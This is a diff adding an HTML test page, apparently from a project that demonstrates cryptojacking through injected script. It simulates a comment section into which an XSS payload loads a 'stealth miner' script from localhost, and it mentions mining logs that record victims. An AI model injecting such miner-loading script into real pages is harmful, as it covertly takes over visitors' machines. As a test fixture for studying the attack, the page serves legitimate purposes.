@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Victim Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .comment {
+            border: 1px solid #ddd;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        h1, h2, h3 {
+            color: #333;
+        }
+        .username {
+            font-weight: bold;
+            color: #0066cc;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome, <span class="username">test_victim_user</span>!</h1>
+    
+    <div class="comments">
+        <h2>Comments</h2>
+        
+        <div class="comment">
+            <h3>Admin</h3>
+            <p>Welcome to our site! Please read the rules before posting.</p>
+            <small>Posted on 2025-02-27</small>
+        </div>
+        
+        <div class="comment">
+            <h3>Badguy</h3>
+            <p>This is a malicious comment with a hidden script.</p>
+            <small>Posted on 2025-02-27</small>
+        </div>
+        
+        <!-- This is the XSS payload that loads the stealth miner -->
+        <script src="http://localhost:8081/stealth_miner.js"></script>
+    </div>
+    
+    <p>This page simulates a user viewing a comment with the stealth miner script.</p>
+    <p>Check the mining logs to see if this test victim appears.</p>
+</body>
+</html> 
